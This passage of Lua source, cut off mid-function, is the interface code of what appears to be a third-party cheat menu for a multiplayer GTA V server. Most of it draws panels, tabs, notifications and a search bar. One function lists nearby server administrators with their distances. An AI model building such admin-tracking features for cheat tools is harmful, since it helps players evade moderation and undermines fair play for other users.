    local _DrawShadowCircle = FrameAPI.Drawing.DrawShadowCircle
    local _DrawShadowLine = FrameAPI.Drawing.DrawShadowLine
    local _DrawImage = FrameAPI.Drawing.DrawImage
    local _DrawText = FrameAPI.Drawing.DrawText
    local _GetTextWidth = FrameAPI.Fonts.GetTextWidthSize
    local _floor = math.floor
    local _max = math.max
    local _min = math.min
    local _abs = math.abs
    local _tonumber = tonumber
    local _tostring = tostring
    local function aspectDrawOrder(order)
        local offset = 0
        if my.interact and my.interact.activeDrawOrderOffset then
            offset = my.interact.activeDrawOrderOffset
        end
        return (order or 0) + offset
    end
    local function aspectContentColor(color)
        local fade = 1.0
        if my.interact and my.interact.activeContentAlpha ~= nil then
            fade = tonumber(my.interact.activeContentAlpha) or 1.0
            fade = math.max(0.0, math.min(1.0, fade))
        end
        return
            math.floor(color[1] or 255),
            math.floor(color[2] or 255),
            math.floor(color[3] or 255),
            math.floor((color[4] or 255) * fade)
    end
    function my.ui.drawRect(x, y, w, h, color, rounding, outline, order, id)
        local drawOrder = aspectDrawOrder(order)
        local r, g, b, a = aspectContentColor(color)
        local nx = tonumber(x) or 0.0
        local ny = tonumber(y) or 0.0
        local nw = math.max(0.0, tonumber(w) or 0.0)
        local nh = math.max(0.0, tonumber(h) or 0.0)
        local nr = tonumber(rounding) or 0.0
        local isOutline = outline == true
        _DrawRect(
            _tostring(id or ''),
            math.floor(nx), math.floor(ny),
            math.floor(nw), math.floor(nh),
            r, g, b, a,
            nr + 0.0, drawOrder,
            not isOutline, isOutline
        )
    end
    local function safeNumber(v, fallback)
        local n = tonumber(v)
        if n == nil then return fallback or 0.0 end
        return n
    end
    function my.ui.drawShadowRect(x, y, w, h, color, shadow, rounding, order, id)
        local r, g, b, a = aspectContentColor(color)
        _DrawShadowRect(
            _tostring(id or ''),
            _floor(safeNumber(x)), _floor(safeNumber(y)),
            _floor(_max(0, safeNumber(w))), _floor(_max(0, safeNumber(h))),
            r, g, b, a,
            safeNumber(shadow, 25.0),
            safeNumber(rounding, 4.0),
            aspectDrawOrder(order)
        )
    end
    function my.ui.drawShadowCircle(x, y, radius, thickness, color, shadow, order, id)
        if not _DrawShadowCircle then return end
        local r, g, b, a = aspectContentColor(color)
        _DrawShadowCircle(
            _tostring(id or ''),
            _floor(safeNumber(x)), _floor(safeNumber(y)),
            safeNumber(radius, 5.0),
            safeNumber(thickness, 5.0),
            r, g, b, a,
            safeNumber(shadow, 60.0),
            aspectDrawOrder(order)
        )
    end
    function my.ui.drawShadowLine(x1, y1, x2, y2, thickness, color, shadow, order, id)
        if not _DrawShadowLine then return end
        local r, g, b, a = aspectContentColor(color)
        _DrawShadowLine(
            _tostring(id or ''),
            _floor(safeNumber(x1)), _floor(safeNumber(y1)),
            _floor(safeNumber(x2)), _floor(safeNumber(y2)),
            safeNumber(thickness, 3.0),
            r, g, b, a,
            safeNumber(shadow, 60.0),
            aspectDrawOrder(order)
        )
    end
    function my.ui.drawImage(image, x, y, w, h, color, order, id, rounding)
        local r, g, b, a = aspectContentColor(color)
        local nx, ny = safeNumber(x), safeNumber(y)
        local nw, nh = math.max(0, safeNumber(w)), math.max(0, safeNumber(h))
        _DrawImage(
            _tostring(id or ''), _tostring(image or ''),
            _floor(nx), _floor(ny),
            _floor(nw), _floor(nh),
            r, g, b, a,
            aspectDrawOrder(order),
            safeNumber(rounding, 0.0)
        )
    end
    function my.ui.drawFontAwesome(icon, x, y, size, color, centered, order, id)
        local r, g, b, a = aspectContentColor(color)
        _DrawText(
            _tostring(id or ''), _tostring(icon or ''),
            _floor(safeNumber(x)), _floor(safeNumber(y)),
            safeNumber(size), centered == true,
            r or 255, g or 255, b or 255, a or 255,
            my.fontAwesome.font or 'default',
            aspectDrawOrder(order)
        )
    end
    my.mouse = {frameX = 0, frameY = 0, frameReady = false}
    function my.mouse.beginFrame()
        local mousex, mousey = GetNuiCursorPosition()
        my.mouse.frameX = mousex or my.mouse.frameX or 0
        my.mouse.frameY = mousey or my.mouse.frameY or 0
        my.mouse.frameReady = true
        return my.mouse.frameX, my.mouse.frameY
    end
    function my.mouse.getCursorPosition()
        if not my.mouse.frameReady then
            return my.mouse.beginFrame()
        end
        return my.mouse.frameX, my.mouse.frameY
    end
    function my.mouse.getMouseY()
        local _, mousey = my.mouse.getCursorPosition()
        return mousey
    end
    function my.mouse.getMouseX()
        local mousex = my.mouse.getCursorPosition()
        return mousex
    end
    my.mouse.isHovered = function(x, y, w, h)
        if my.interact and my.interact.activeContentAlpha ~= nil and my.interact.activeContentAlpha < 0.90 then
            return false
        end
        local mX, mY = my.mouse.getCursorPosition()
        local hovered = x <= mX and mX <= x + w and y <= mY and mY <= y + h
        if not hovered then return false end
        local clip = my.interact and my.interact.activeClipRect
        if clip then
            return mX >= clip.x and mX <= (clip.x + clip.w)
               and mY >= clip.y and mY <= (clip.y + clip.h)
        end
        return true
    end
    function my.mouse.displayCursor()
        local x, y = my.mouse.getCursorPosition()
        if x == nil or y == nil then return end
        local cursorW, cursorH = 20, 20
        local screenW = (my.screen and my.screen.w) or 1920
        local screenH = (my.screen and my.screen.h) or 1080
        local drawX = math.max(0, math.min(screenW - cursorW, x))
        local drawY = math.max(0, math.min(screenH - cursorH, y))
        my.ui.drawImage('cursor', drawX, drawY, cursorW, cursorH, {255, 255, 255, 255}, 999, '##mouseCursor')
    end
    local mathFuncs = {}
    function mathFuncs.floatToPixel(width, height)
        local sW, sH = my.screen.w, my.screen.h
        local pW, pH = sW * width, sH * height
        return pW, pH
    end
    my.texts = {}
    my.texts.widthCache = {}
    my.texts.widthCacheCount = 0
    my.texts.getTextWidth = function(text, scale, icon)
        local font = icon and 'iconfonts' or 'barlowSemiBold'
        local txt = _tostring(text or '')
        local sc = _tonumber(scale) or 0.0
        local key = font .. '' .. sc .. '' .. txt
        local cached = my.texts.widthCache[key]
        if cached ~= nil then return cached end
        local value = _GetTextWidth(txt, sc + 0.0, font) or 0.0
        if my.texts.widthCacheCount >= 1024 then
            my.texts.widthCache = {}
            my.texts.widthCacheCount = 0
        end
        my.texts.widthCache[key] = value
        my.texts.widthCacheCount = my.texts.widthCacheCount + 1
        return value
    end
    my.texts.drawText = function(text, x, y, outline, alignment, scale, color, order, id, icon)
        local text = tostring(text or '')
        local center = false
        local font = 'barlowSemiBold'
        if icon then
            font = 'iconfonts'
        end
        if alignment == 'center' then
            center = true
        end
        local r, g, b, a = aspectContentColor(color)
        _DrawText(id, text, _floor(x), _floor(y), scale+0.0, center, r, g, b, a, font, aspectDrawOrder(order))
    end
    local snowParticles = {}
    local function createSnowParticle()
        return {
            x = math.random(),
            y = -0.1,
            speed = math.random(10, 70) / 10500,
            size = math.random(1, 3),
            horizontalSpeed = math.random(0, 3) > 1 and math.random(1, 5) / 10000 or 0,
        }
    end
    for i = 1, 30 do
        table.insert(snowParticles, createSnowParticle())
    end
    function mysticEssential.natalParticles()
        for _, particle in ipairs(snowParticles) do
            particle.y = particle.y + particle.speed
            if particle.horizontalSpeed > 0 then
                particle.x = particle.x + particle.horizontalSpeed
            end
            if particle.y > 1.1 or particle.x > 1 then
                particle.x = math.random()
                particle.y = -0.1
                particle.speed = math.random(10, 70) / 10500
                particle.size = math.random(1, 3)
                particle.horizontalSpeed = math.random(0, 3) > 1 and math.random(1, 5) / 10000 or 0
            end
            local x, y = mathFuncs.floatToPixel(particle.x, particle.y)
            FrameAPI.Drawing.DrawCircle('##snowFlake_'..tostring(_), x, y, particle.size, 20.0, 2.0, 255, 255, 255, 255, true);
        end
    end
    my.display = {}
    function my.display.backgrounds()
        local dragX, dragY = my.vars.dragPos.x, my.vars.dragPos.y
        local wBg, hBg = my.sizes.mainBackground[1], my.sizes.mainBackground[2]
        local sidebarW = my.sizes.subtabBackground[1]
        local contentW = my.sizes.elementsBackground[1]
        local xBg, yBg = my.math.centerPos(wBg, hBg)
        xBg, yBg = xBg + dragX, yBg + dragY
        my.pos.mainBackground.x, my.pos.mainBackground.y = xBg, yBg
        my.pos.subtabBackground.x, my.pos.subtabBackground.y = xBg, yBg
        my.pos.elementsBackground.x, my.pos.elementsBackground.y = xBg + sidebarW, yBg
        my.ui.drawRect(xBg, yBg, sidebarW + 20, hBg, {25, 23, 29, 170}, 11, false, 0, '##aspectSidebar')
        my.ui.drawRect(xBg + sidebarW, yBg, contentW, hBg, {23, 22, 26, 255}, 11, false, 0, '##aspectContent')
        my.ui.drawRect(xBg + sidebarW, yBg, 1, hBg, {47, 42, 54, 255}, 0, false, 1, '##aspectVerticalSeparator')
        my.ui.drawRect(xBg + sidebarW, yBg + 44, contentW, 1, {47, 42, 54, 255}, 0, false, 1, '##aspectTopSeparator')
        if my.bool["neve"] then
            mysticEssential.natalParticles()
        end
    end
    function my.display.logo()
        local sidebarX = my.pos.subtabBackground.x
        local sidebarW = my.sizes.subtabBackground[1]
        local w, h = 165, 62
        local x = sidebarX + ((sidebarW - w) / 2)
        local y = my.pos.subtabBackground.y + 8
        my.ui.drawImage('aspect_logo', x, y, w, h, {255, 255, 255, 255}, 4, '##aspectLogo')
    end
    my.display.topperVars =
    {
        catTexts =
        {
            adjust = 0.0
        }
    }
    function my.display.topperElem()
        local x = my.pos.elementsBackground.x + 8
        local y = my.pos.elementsBackground.y + 45
        my.pos.separatorElements.x = x
        my.pos.separatorElements.y = y
    end
    my.display.userVars =
    {
        y = 0.0,
        alpha = 100.0,
    }
    function my.display.userInfos()
        local sidebarX = my.pos.subtabBackground.x
        local sidebarY = my.pos.subtabBackground.y
        local sidebarH = my.sizes.subtabBackground[2]
        local cardX = sidebarX + 14
        local cardY = sidebarY + sidebarH - 59
        local cardW, cardH = 174, 47
        my.ui.drawRect(cardX, cardY, cardW, cardH, {0, 0, 0, 0}, 7, false, 3, '##aspectDiscordCard')
        my.ui.drawRect(cardX + 1, cardY + 1, cardW - 2, cardH - 2, {0, 0, 0, 0}, 7, false, 4, '##aspectDiscordCardInner')
        local avatarX, avatarY = cardX + 6, cardY + 5
        local avatarW, avatarH = 37, 37
        local discordName = (my.brand and my.brand.discord and my.brand.discord.name) or 'Usuário'
        local dInfo = my.brand and my.brand.discord and my.brand.discord.info
        if dInfo then
            if type(dInfo.UserName) == 'function' then
                local okName, value = pcall(dInfo.UserName)
                if okName and value and tostring(value) ~= '' then discordName = tostring(value) end
            elseif type(dInfo.UserName) == 'string' and dInfo.UserName ~= '' then
                discordName = dInfo.UserName
            end
        end
        if my.brand and my.brand.discord and my.brand.discord.avatarLoaded then
            my.ui.drawImage('discordAvatar', avatarX, avatarY, avatarW, avatarH,
                {255, 255, 255, 255}, 6, '##aspectDiscordAvatar', avatarW / 2)
        else
            my.ui.drawFontAwesome(my.fontAwesome.icons.user, avatarX + avatarW / 2, avatarY + 8, 20,
                {160, 154, 170, 255}, true, 6, '##aspectDiscordAvatarFallbackIcon')
        end
        local discordRole = 'Cliente'
        local okRole, role = pcall(function()
            return next.cargos.get_role()
        end)
        if okRole and role and tostring(role) ~= '' then
            discordRole = tostring(role)
        elseif my.brand and my.brand.discord and my.brand.discord.role then
            discordRole = tostring(my.brand.discord.role)
        end
        if my.brand and my.brand.discord then
            my.brand.discord.role = discordRole
        end

        my.texts.drawText(discordName, cardX + 51, cardY + 9, false, 'left', 14.5,
            {235, 233, 239, 255}, 6, '##aspectDiscordName')
        my.texts.drawText(discordRole, cardX + 51, cardY + 26, false, 'left', 12.5,
            {137, 130, 146, 255}, 6, '##aspectDiscordRole')
    end
    function my.display.displayCalls()
        my.display.backgrounds()
        my.display.logo()
        my.display.userInfos()
        my.display.topperElem()
    end
    my.interact = {}
    my.interact.notifyVars = {
        running = false,
        serial = 0,
    }
    my.interact.listNotify = {}
    local function notifyEaseOutExpo(value)
        if value >= 1.0 then return 1.0 end
        if value <= 0.0 then return 0.0 end
        return 1.0 - (2.0 ^ (-10.0 * value))
    end
    local function notifyEaseInOutQuad(value)
        if value < 0.5 then
            return 2.0 * value * value
        end
        return 1.0 - (((-2.0 * value + 2.0) ^ 2.0) / 2.0)
    end
    local function resolveNotifyIcon(icon)
        if icon == nil or icon == '' then
            return "\xEF\x83\x82"
        end
        local value = tostring(icon)
        local hex = value:gsub('^0[xX]', ''):gsub('^#', '')
        if hex:match('^[%x]+$') and utf8 and utf8.char then
            local codepoint = tonumber(hex, 16)
            if codepoint then
                local ok, result = pcall(utf8.char, codepoint)
                if ok and result then
                    return result
                end
            end
        end
        return value
    end
    my.interact.Notify = function(description, name, icon, duration)
        local screenW = select(1, GetActiveScreenResolution())
        duration = tonumber(duration) or 5000
        my.interact.notifyVars.serial = my.interact.notifyVars.serial + 1
        table.insert(my.interact.listNotify, {
            id = my.interact.notifyVars.serial,
            name = tostring(name or 'next'),
            description = tostring(description or ''),
            icon = resolveNotifyIcon(icon),
            time = GetGameTimer(),
            tempo = duration,
            x = screenW + 500,
            opacity = 0,
            yPosition = 0,
        })
        if my.interact.notifyVars.running then
            return
        end
        my.interact.notifyVars.running = true
        nt.createTh(function()
            while not my.mainVars.breakTh and #my.interact.listNotify > 0 do
                local now = GetGameTimer()
                local currentW, currentH = GetActiveScreenResolution()
                for index = #my.interact.listNotify, 1, -1 do
                    local notify = my.interact.listNotify[index]
                    local elapsed = now - notify.time
                    local descriptionWidth = my.texts.getTextWidth(notify.description, 14)
                    local nameWidth = my.texts.getTextWidth(notify.name, 15.5)
                    local width = math.max(descriptionWidth, nameWidth)
                    local targetX = currentW - (60 + width + 50)
                    local remove = false
                    if elapsed < 500 then
                        local progress = elapsed / 500
                        notify.x = (currentW + 500) + (targetX - (currentW + 500)) * notifyEaseOutExpo(progress)
                        notify.opacity = math.min(255, notify.opacity + 8)
                    elseif elapsed < notify.tempo then
                        notify.x = targetX
                        notify.opacity = 255
                    elseif elapsed < notify.tempo + 600 then
                        local progress = (elapsed - notify.tempo) / 600
                        notify.x = targetX + ((currentW + 500) - targetX) * notifyEaseInOutQuad(progress)
                        notify.opacity = math.max(0, notify.opacity - 8)
                    else
                        remove = true
                    end
                    if remove then
                        table.remove(my.interact.listNotify, index)
                    else
                        local targetY = 20 + (50 * (index - 1))
                        notify.yPosition = notify.yPosition + (targetY - notify.yPosition) * 0.04
                        if not (notify.x + 200 < 0 or notify.x > currentW or notify.yPosition + 60 < 0 or notify.yPosition > currentH) then
                            local r, g, b = my.colors.main[1], my.colors.main[2], my.colors.main[3]
                            local baseX = notify.x + 40
                            local textX = notify.x + 85
                            local iconX = notify.x + 56
                            local iconY = notify.yPosition + 12
                            local drawId = tostring(notify.id)
                            my.ui.drawRect(baseX, notify.yPosition, 47 + width + 8, 42,
                                {15, 16, 18, notify.opacity}, 10, false, 11500, '##notifyBg_' .. drawId)
                            my.ui.drawRect(baseX, notify.yPosition + 11, 6, 21,
                                {r, g, b, notify.opacity}, 10, false, 11501, '##notifyAccent_' .. drawId)
                            my.texts.drawText(notify.description, textX, notify.yPosition + 22, false, 'left', 14,
                                {170, 170, 170, notify.opacity}, 11503, '##notifyDescription_' .. drawId)
                            my.texts.drawText(notify.name, textX, notify.yPosition + 7, false, 'left', 15.5,
                                {255, 255, 255, notify.opacity}, 11504, '##notifyName_' .. drawId)
                            my.ui.drawFontAwesome(notify.icon, iconX, iconY, 19,
                                {r, g, b, notify.opacity}, false, 11506, '##notifyIcon_' .. drawId)
                        end
                    end
                end
                Wait(0)
            end
            my.interact.notifyVars.running = false
        end)
    end
    my.interact.notify = function(text, kind, time)
        local types = {
            success = {name = 'Sucesso', icon = 'f058'},
            info = {name = 'Info', icon = 'f05a'},
            error = {name = 'Erro', icon = 'f057'},
            warning = {name = 'Aviso', icon = 'f071'},
        }
        local data = types[tostring(kind or 'info')] or types.info
        my.interact.Notify(text, data.name, data.icon, time)
    end
    my.interact.adminVars =
    {
        h = 0.0,
        x = 0.0, y = 0.0,
        isDragging = false,
    }
    my.interact.adminList = function ()
        local playersTable = GetActivePlayers()
        local x, y = 60+my.interact.adminVars.x, 60+my.interact.adminVars.y
        local w, h = 230, 34
        my.ui.drawRect(x, y, w, h, my.colors.adminList.titleBg, 7, false, 2, '##titleBg_AdminList')
        local dist = 2
        local iconW, iconH = 35, 35
        local iconX, iconY = x+dist, y+(h/2)-(iconH/2)
        my.ui.drawImage('self_icon', iconX, iconY, iconW, iconH, my.colors.adminList.titleText, 2, '##titleIcon_AdmninList')
        local title = 'Admnistrators'
        local titleScale = 16
        local titleX, titleY = iconX+iconW-4, y+(h/2)-(titleScale/2)
        my.texts.drawText(title, titleX, titleY, false, 'left', titleScale, my.colors.adminList.titleText, 2, '##titleText_AdmninList')
        local admins = {}
        local distanceMax = 50
        for i, player in ipairs(playersTable) do
            if player then
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(GetPlayerPed(player)), false)
                if my.others.isAdmin(player) and distance <= distanceMax and player ~= PlayerId() then
                    table.insert(admins, {player = player, distance = distance})
                end
            end
        end
        table.sort(admins, function(a, b)
            return a.distance < b.distance
        end)
        local add = 30
        local bgW, bgH = w, h+(add*#admins)
        local bgX, bgY = x, y
        local animVel = my.vars.animVels.main
        my.interact.adminVars.h = my.anim.lerp(my.interact.adminVars.h, bgH, animVel)
        my.ui.drawRect(bgX, bgY, bgW, my.interact.adminVars.h, my.colors.adminList.bg, 7, false, 0, '##background_AdminList')
        local txtScale = 16
        for i, admin in ipairs(admins) do
            local distance = math.floor(admin.distance) or 0
            local name = GetPlayerName(admin.player)
            local textX, textY = x+10, bgY+h+(add*i)-(add/2)-(txtScale/2)
            my.texts.drawText(name, textX, textY, false, 'left', txtScale, my.colors.main, 0, '##admnistratorAdminList_'..tostring(name or '')..tostring(distance or ''))
            local loc = '5'
            local locScale = 16
            local locWidth = my.texts.getTextWidth(loc, locScale)
            local locX, locY = x+w-locWidth-12, bgY+h+(add*i)-(add/2)-(locScale/2)
            my.texts.drawText(loc, locX, locY, false, 'left', locScale,  my.colors.adminList.location, 0, '##locationIcon_'..tostring(name or '')..tostring(distance or ''), true)
            local distText = tostring(distance)..'m'
            local distScale = 15
            local distTextWidth = my.texts.getTextWidth(distText, distScale)
            local distX, distY = locX-distTextWidth-5, bgY+h+(add*i)-(add/2)-(distScale/2)
            my.texts.drawText(distText, distX, distY, false, 'left', distScale, my.colors.adminList.titleText, 0, '##distanceAdmin_'..tostring(name or '')..tostring(distance or ''))
        end
        local cursorPosX, cursorPosY = my.mouse.getCursorPosition()
        if my.mouse.isHovered(bgX, bgY, bgW, bgH) and isLeftButtonJustPressed() then
            adminXx = my.interact.adminVars.x - cursorPosX
            adminYy = my.interact.adminVars.y - cursorPosY
            my.interact.adminVars.isDragging = true
        elseif not isLeftButtonPressed() then
            my.interact.adminVars.isDragging = false
        end
        if my.interact.adminVars.isDragging then
            my.interact.adminVars.x = cursorPosX + adminXx
            my.interact.adminVars.y = cursorPosY + adminYy
        end
    end
    my.interact.tabVars =
    {
        pos =
        {
            x = 0.0,
            y = 0.0,
        },
        sizebg = {0, 0},
        tabs = {},
        selectedBg = {
            initialized = false,
            x = 0.0, y = 0.0, w = 0.0, h = 34.0,
            targetX = 0.0, targetY = 0.0, targetW = 0.0, targetH = 34.0
        }
    }
    function my.interact.tab(entryId, text, image, parentId, titleId, subtabId)
        if not my.interact.tabVars.tabs[entryId] then
            my.interact.tabVars.tabs[entryId] = {selected = 0.0, hover = 0.0}
        end
        local state = my.interact.tabVars.tabs[entryId]
        local isSelected = my.mainVars.navEntry == entryId
        local x = my.pos.subtabBackground.x + 9
        local y = my.pos.subtabBackground.y + 75 + my.interact.tabVars.pos.y
        local rowW = my.sizes.subtabBackground[1] - 18
        local rowH = 34
        local isHover = my.mouse.isHovered(x, y, rowW, rowH)
        state.selected = my.anim.lerp(state.selected or 0.0, isSelected and 1.0 or 0.0, 0.12)
        state.hover = my.anim.lerp(state.hover or 0.0, (isHover and not isSelected) and 1.0 or 0.0, 0.14)
        local selectedBg = my.interact.tabVars.selectedBg
        if isSelected then
            selectedBg.targetX = x
            selectedBg.targetY = y
            selectedBg.targetW = rowW
            selectedBg.targetH = rowH
            if not selectedBg.initialized then
                selectedBg.x = x
                selectedBg.y = y
                selectedBg.w = rowW
                selectedBg.h = rowH
                selectedBg.initialized = true
            else
                selectedBg.x = my.anim.lerp(selectedBg.x or x, selectedBg.targetX, 0.16)
                selectedBg.y = my.anim.lerp(selectedBg.y or y, selectedBg.targetY, 0.16)
                selectedBg.w = my.anim.lerp(selectedBg.w or rowW, selectedBg.targetW, 0.16)
                selectedBg.h = my.anim.lerp(selectedBg.h or rowH, selectedBg.targetH, 0.16)
                if math.abs((selectedBg.y or y) - selectedBg.targetY) < 0.05 then
                    selectedBg.y = selectedBg.targetY
                end
            end
            my.ui.drawRect(
                selectedBg.x, selectedBg.y, selectedBg.w, selectedBg.h,
                {20, 19, 24, 75},
                3, false, 2, '##cleanTabSelectedBg'
            )
        elseif state.hover > 0.01 then
            my.ui.drawRect(
                x, y, rowW, rowH,
                {20, 19, 24, math.floor(24 * state.hover)},
                3, false, 2, '##cleanTabHoverBg_'..tostring(entryId or '')
            )
        end
        if state.selected > 0.01 then
            local glowAlpha = math.floor(255 * state.selected)
            local glowOuterAlpha = math.floor(220 * state.selected)
            local lineAlpha = math.floor(255 * state.selected)
            local maxLineH = math.max(10, rowH - 8)
            local lineH = maxLineH * state.selected
            local lineY = y + ((rowH - lineH) / 2)
            my.ui.drawShadowCircle(
                x + 15, y + (rowH * 0.5),
                5.0, 5.0,
                {my.colors.main[1], my.colors.main[2], my.colors.main[3], glowOuterAlpha},
                90.0, 5, '##cleanTabIconShadowOuter_'..tostring(entryId or '')
            )
            my.ui.drawShadowCircle(
                x + 15, y + (rowH * 0.5),
                5.0, 5.0,
                {my.colors.main[1], my.colors.main[2], my.colors.main[3], glowAlpha},
                35.0, 6, '##cleanTabIconShadowInner_'..tostring(entryId or '')
            )
            my.ui.drawShadowLine(
                x + 1, lineY, x + 1, lineY + lineH,
                3,
                {my.colors.main[1], my.colors.main[2], my.colors.main[3], lineAlpha},
                60, 5, '##cleanTabLineShadow_'..tostring(entryId or '')
            )
            my.ui.drawRect(
                x, lineY, 3, lineH,
                {my.colors.main[1], my.colors.main[2], my.colors.main[3], lineAlpha},
                1, false, 5, '##cleanTabLine_'..tostring(entryId or '')
            )
        end
        local iconColor
        local textColor
        if isSelected then
            iconColor = {my.colors.main[1], my.colors.main[2], my.colors.main[3], 255}
            textColor = {238, 238, 242, 255}
        elseif isHover then
            iconColor = {180, 180, 187, 255}
            textColor = {202, 202, 208, 255}
        else
            iconColor = {125, 125, 134, 255}
            textColor = {145, 145, 153, 255}
        end
        local faIcon = my.fontAwesome.forEntry(text, parentId)
        my.ui.drawFontAwesome(
            faIcon, x + 15, y + 9, 15,
            iconColor, true, 6, '##cleanTabFA_'..tostring(entryId or '')
        )
        my.texts.drawText(
            text or '', x + 32, y + 8, false, 'left', 15.5,
            textColor, 6, '##cleanTabText_'..tostring(entryId or '')
        )
        if isHover and isLeftButtonJustPressed() and not my.frame.blockClicks then
            my.mainVars.navEntry = entryId
            my.mainVars.navTitle = titleId
            my.mainVars.tab = parentId
            my.mainVars.iconTab = image
            for _, parent in ipairs(my.render.elements) do
                if parent.id == parentId then
                    parent.cursubtab = subtabId or parent.cursubtab
                    break
                end
            end
        end
        my.interact.tabVars.pos.y = my.interact.tabVars.pos.y + 36
    end
    function my.interact.tabCategory(text)
        if my.interact.tabVars.pos.y > 0 then
            my.interact.tabVars.pos.y = my.interact.tabVars.pos.y + 6
        end
        local x = my.pos.subtabBackground.x + 9
        local y = my.pos.subtabBackground.y + 75 + my.interact.tabVars.pos.y
        my.texts.drawText(
            text or '', x, y + 1, false, 'left', 12.0,
            {92, 92, 102, 255}, 5, '##cleanTabCategory_'..tostring(text or '')
        )
        my.interact.tabVars.pos.y = my.interact.tabVars.pos.y + 23
    end
        my.interact.titleVars =
        {
            pos =
            {
                lastY = 0.0,
                x = 0.0,
                y = 0.0,
                yAdd = 0.0,
            }
        }
        my.interact.searchVars =
        {
            active = false,
            alpha = math.floor(255*0.04),
            alphaStroke = math.floor(255*0.02),
            xIcon = 0.0,
            text = "",
            alphabar = 0,
            change = false,
            on =
            {
            },
        }
        my.interact.searchBar = function ()
            local vars = my.interact.searchVars
            vars.blocktext = vars.blocktext or false
            local w, h = 100, 30
            local x = my.pos.elementsBackground.x + my.sizes.elementsBackground[1] - w - 8
            local y = my.pos.elementsBackground.y + 7
            local isHover = my.mouse.isHovered(x, y, w, h)
            local displayText = vars.text
            if vars.active and (not displayText or displayText == '') then
                displayText = ''
            elseif not displayText or displayText == '' then
                displayText = 'Pesquisar'
            end
            local shownText = tostring(displayText or '')
            while #shownText > 0 and my.texts.getTextWidth(shownText, 15.5) > 65 do
                shownText = string.sub(shownText, 2)
            end
            my.ui.drawRect(x, y, w, h, {39, 39, 39, 255}, 7, false, 7, '##aspectSearchOuter')
            my.ui.drawRect(x + 1, y + 1, w - 2, h - 2, {29, 29, 29, 255}, 7, false, 8, '##aspectSearchInner')
            local textColor = (isHover or vars.active) and 170 or 121
            my.ui.drawFontAwesome(my.fontAwesome.icons.search, x + 15, y + 7, 14,
                {textColor, textColor, textColor, 255}, true, 9, '##aspectSearchIconFA')
            my.texts.drawText(shownText, x + 30, y + 7, false, 'left', 15.5,
                {textColor, textColor, textColor, 255}, 9, '##aspectSearchText')
            if isHover and isLeftButtonJustPressed() and not my.frame.blockClicks then
                vars.active = true
                vars.blocktext = false
                vars.text = ''
                vars.tab = my.mainVars.tab
                vars.subtab = my.mainVars.curSubtab
                vars.alphabar = 0
                vars.change = false
            end
            if vars.active then
                if vars.tab ~= my.mainVars.tab or vars.subtab ~= my.mainVars.curSubtab then
                    vars.active = false
                    vars.text = ''
                    vars.blocktext = false
                    return
                end
                if IsKeyJustPressed(myAPI.Keys['ESC']) then
                    vars.active = false
                    vars.text = ''
                    vars.blocktext = false
                    return
                end
                if IsKeyJustPressed(myAPI.Keys['ENTER']) then
                    vars.active = false
                end
                if not isHover and isLeftButtonJustPressed() then
                    vars.active = false
                end
                if vars.active and not vars.blocktext then
                    local currentWidth = my.texts.getTextWidth(vars.text or '', 15.5)
                    if currentWidth < 240 then
                        for txt, vkcode in pairs(myAPI.keysTextBox) do
                            if vkcode and IsKeyJustPressed(vkcode) then
                                local textAdd = txt
                                if IsKeyPressed(myAPI.Keys['SHIFT']) then
                                    textAdd = string.upper(txt)
                                end
                                vars.text = (vars.text or '') .. tostring(textAdd)
                            end
                        end
                    end
                    if IsKeyPressed(myAPI.Keys['BACKSPACE']) and ((my.vars.backdelay or 0) < GetGameTimer()) then
                        my.vars.backdelay = GetGameTimer() + 150
                        vars.text = string.sub(vars.text or '', 1, -2)
                        if vars.text == '' then
                            vars.active = false
                        end
                    end
                end
            end
        end
        my.interact.subtabVars =
        {
            pos =
            {
                x = 0.0,
                y = 0.0,
            },
            icon =
            {
                w = 18, h = 18
            },
            selectedBg = {
                initialized = false,
                x = 0.0,
                w = 90.0,
                alpha = 0.0,
            },
        }
        my.interact.pageFade = {
            key = nil,
            alpha = 1.0
        }
        my.interact.subtabs = {}
        function my.interact.subtab(tab, curtitle, id, name, groupboxes, bridge)
            local isSearching = my.others.isSearching()
            if isSearching then return end
            local uniqueid = tostring(tab.id or '')..'_'..tostring(id or '')
            if not my.interact.subtabs[uniqueid] then
                my.interact.subtabs[uniqueid] = {active = 0.0, hover = 0.0}
            end
            local state = my.interact.subtabs[uniqueid]
            local isSelected = id == tab.cursubtab
            if isSelected then
                my.mainVars.curTitle = curtitle
                my.mainVars.curSubtab = name
            end
            local textScale = 15.0
            local textWidth = my.texts.getTextWidth(name or '', textScale)
            local wElement = math.max(90, math.min(145, textWidth + 48))
            local hElement = 32
            local xElement = my.pos.elementsBackground.x + 10 + my.interact.subtabVars.pos.x
            local yElement = my.pos.elementsBackground.y + 7
            local isHover = my.mouse.isHovered(xElement, yElement, wElement, hElement)
            state.active = my.anim.lerp(state.active or 0.0, isSelected and 1.0 or 0.0, 0.14)
            state.hover = my.anim.lerp(state.hover or 0.0, (isHover and not isSelected) and 1.0 or 0.0, 0.14)
            local selectedBg = my.interact.subtabVars.selectedBg
            if isSelected then
                if not selectedBg.initialized then
                    selectedBg.x = xElement
                    selectedBg.w = wElement
                    selectedBg.alpha = 1.0
                    selectedBg.initialized = true
                else
                    selectedBg.x = my.anim.lerp(selectedBg.x or xElement, xElement, 0.12)
                    selectedBg.w = my.anim.lerp(selectedBg.w or wElement, wElement, 0.12)
                    selectedBg.alpha = my.anim.lerp(selectedBg.alpha or 0.0, 1.0, 0.14)
                end
                my.ui.drawRect(
                    selectedBg.x,
                    yElement + 1,
                    selectedBg.w,
                    hElement - 2,
                    {38, 37, 43, math.floor(65 * selectedBg.alpha)},
                    5,
                    false,
                    4,
                    '##smoothSelectedSubtabBg'
                )
            end
            if state.active > 0.01 then
                local maxLineH = math.max(10, hElement - 8)
                local lineH = maxLineH * state.active
                local lineY = yElement + ((hElement - lineH) / 2)
                local lineAlpha = math.floor(255 * state.active)
                local glowAlpha = math.floor(255 * state.active)
                local glowOuterAlpha = math.floor(220 * state.active)
                my.ui.drawShadowCircle(
                    xElement + 18, yElement + (hElement * 0.5),
                    5.0, 5.0,
                    {my.colors.main[1], my.colors.main[2], my.colors.main[3], glowOuterAlpha},
                    90.0, 5, '##cleanSubtabIconShadowOuter_'..uniqueid
                )
                my.ui.drawShadowCircle(
                    xElement + 18, yElement + (hElement * 0.5),
                    5.0, 5.0,
                    {my.colors.main[1], my.colors.main[2], my.colors.main[3], glowAlpha},
                    35.0, 6, '##cleanSubtabIconShadowInner_'..uniqueid
                )
                my.ui.drawShadowLine(
                    xElement + 1, lineY, xElement + 1, lineY + lineH,
                    3,
